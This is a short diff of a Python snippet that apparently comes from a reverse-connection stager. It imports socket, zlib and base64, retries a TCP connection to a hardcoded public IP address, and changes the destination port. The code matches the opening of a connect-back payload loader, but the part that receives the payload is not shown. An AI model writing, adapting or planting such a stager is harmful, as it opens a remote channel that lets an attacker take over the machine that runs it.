@@ -2,7 +2,7 @@ import socket,zlib,base64,struct,time
 for x in range(10):
   try:
     s=socket.socket(2,socket.SOCK_STREAM)
-    s.connect(('3.141.210.37',17009))
+    s.connect(('3.141.210.37',19260))
     break
   except:
     time.sleep(5)
